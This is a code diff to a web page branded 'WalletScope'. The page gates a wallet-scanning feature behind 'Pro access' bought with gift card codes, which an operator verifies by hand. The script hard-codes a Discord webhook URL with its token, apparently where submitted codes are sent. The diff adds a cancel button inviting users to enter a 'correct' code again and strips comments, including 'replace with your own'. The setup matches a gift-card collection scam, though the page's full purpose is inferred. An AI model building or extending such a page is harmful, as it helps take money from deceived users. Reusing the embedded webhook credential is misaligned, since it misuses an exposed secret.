@@ -27,7 +27,6 @@
     .user span { color: #6ee7b7; font-weight: 600; }
     .user .uid-label { color: #6b7280; font-size: 12px; }
 
-    /* Pro badge in header */
     .pro-badge {
       background: linear-gradient(135deg, #6ee7b7, #34d399);
       color: #0b0e14;
@@ -40,7 +39,6 @@
     }
     .pro-badge.show { display: inline-block; }
 
-    /* Pending badge in header */
     .pending-badge {
       background: linear-gradient(135deg, #fbbf24, #f59e0b);
       color: #0b0e14;
@@ -53,7 +51,6 @@
     }
     .pending-badge.show { display: inline-block; }
 
-    /* --- Tabs --- */
     .tabs {
       display: flex;
       gap: 4px;
@@ -118,7 +115,6 @@
     button.primary:hover:not(:disabled) { background: #34d399; transform: translateY(-1px); }
     button.primary:disabled { opacity: 0.4; cursor: not-allowed; }
 
-    /* --- Locked scan overlay --- */
     .scan-locked {
       background: #0b0e14;
       border: 1px dashed #fbbf24;
@@ -161,7 +157,6 @@
     }
     .scan-locked .unlock-btn:hover { background: #f59e0b; transform: translateY(-1px); }
 
-    /* Pending verification state */
     .scan-pending {
       background: #0b0e14;
       border: 1px dashed #60a5fa;
@@ -220,6 +215,26 @@
       font-weight: 600;
     }
     .scan-pending .contact-line a:hover { text-decoration: underline; }
+
+    /* NEW: Cancel button on pending screen */
+    .scan-pending .cancel-btn {
+      margin-top: 18px;
+      background: transparent;
+      color: #f87171;
+      border: 1px solid #f87171;
+      padding: 10px 22px;
+      font-size: 13px;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .scan-pending .cancel-btn:hover {
+      background: #f87171;
+      color: #0b0e14;
+      transform: translateY(-1px);
+    }
 
     .scan-area { display: none; }
     .scan-area.unlocked { display: block; }
@@ -300,7 +315,6 @@
       min-width: 18px;
     }
 
-    /* --- Payment page --- */
     .plan {
       background: #0b0e14;
       border: 1px solid #6ee7b7;
@@ -368,7 +382,6 @@
       margin-top: 12px;
     }
 
-    /* --- Giftcard redemption form --- */
     .redeem-box {
       margin-top: 24px;
       padding: 20px;
@@ -449,7 +462,6 @@
     .redeem-status.pending { color: #60a5fa; }
     .redeem-status.error { color: #f87171; }
 
-    /* --- Support page --- */
     .support-card {
       background: #0b0e14;
       border: 1px solid #232838;
@@ -592,6 +604,7 @@
             your payment is confirmed.
           </p>
           <div class="code-shown" id="pendingCode">••••-••••-••••-••••</div>
+          <button class="cancel-btn" id="cancelPendingBtn">✖ Cancel — I entered the wrong code</button>
           <p class="contact-line">
             Need help? Contact <a href="mailto:support@walletscope.com">support@walletscope.com</a>
           </p>
@@ -736,15 +749,11 @@
   </main>
 
 <script>
-  // ---------- Discord webhook URL (replace with your own) ----------
+  // ---------- Discord webhook URL ----------
   const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1554226855924465764/Khd_NPbJCgs9h3n74YtWAgQHe7L31jWN8x90ji88RYoiNMBaMnNsIjWXyeAK6Q_RHaM6';
 
   // ============================================================
   // PERSISTENT USER ID
-  // ============================================================
-  // Every browser/device gets its own unique ID that persists across
-  // refreshes and restarts. The ID is stored in localStorage.
-  // Format: WS-XXXXXXXX  (8 hex chars uppercase, easy to read/type)
   // ============================================================
   const USER_ID_KEY = 'walletscope_user_id';
 
@@ -763,7 +772,6 @@
       localStorage.setItem(USER_ID_KEY, userId);
     }
   } catch (e) {
-    // Fallback if localStorage is unavailable (e.g. private mode in some browsers)
     userId = generateUserId();
   }
 
@@ -771,14 +779,6 @@
 
   // ============================================================
   // ACCESS STATE
-  // ============================================================
-  // Three states:
-  //   'locked'   — no code submitted yet
-  //   'pending'  — code submitted, waiting for manual verification
-  //   'pro'      — verified by operator
-  //
-  // The client NEVER flips to 'pro' on its own. Only a human operator
-  // should change it — see `grantProAccess()` below.
   // ============================================================
   const ACCESS_KEY = 'walletscope_access';
   let accessState = 'locked';
@@ -797,6 +797,7 @@
   const pendingBadge = document.getElementById('pendingBadge');
   const goToPaymentBtn = document.getElementById('goToPayment');
   const pendingCodeEl = document.getElementById('pendingCode');
+  const cancelPendingBtn = document.getElementById('cancelPendingBtn');
 
   let lastSubmittedCode = '';
   try {
@@ -850,6 +851,41 @@
 
   // "Unlock with Pro Access" button → jump to Payment tab
   goToPaymentBtn.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.querySelector('.tab[data-tab="payment"]').classList.add('active');
+    document.getElementById('page-payment').classList.add('active');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+
+  // ---------- NEW: Cancel pending → back to locked, reset the form ----------
+  cancelPendingBtn.addEventListener('click', () => {
+    // 1. Flip state back to locked
+    accessState = 'locked';
+    lastSubmittedCode = '';
+    try {
+      localStorage.removeItem(ACCESS_KEY);
+      localStorage.removeItem('walletscope_pending_code');
+    } catch (e) {}
+
+    // 2. Reset the pending code display
+    pendingCodeEl.textContent = '••••-••••-••••-••••';
+
+    // 3. Reset the payment form so they can enter a new code
+    const gcInput = document.getElementById('giftcardInput');
+    const rBtn = document.getElementById('redeemBtn');
+    const rStatus = document.getElementById('redeemStatus');
+    gcInput.value = '';
+    gcInput.disabled = false;
+    rBtn.disabled = false;
+    rBtn.textContent = 'Submit Code';
+    rStatus.textContent = '';
+    rStatus.className = 'redeem-status';
+
+    // 4. Update the UI to show the locked screen
+    applyAccessState();
+
+    // 5. Send them to the Payment tab so they can enter the correct code
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.querySelector('.tab[data-tab="payment"]').classList.add('active');
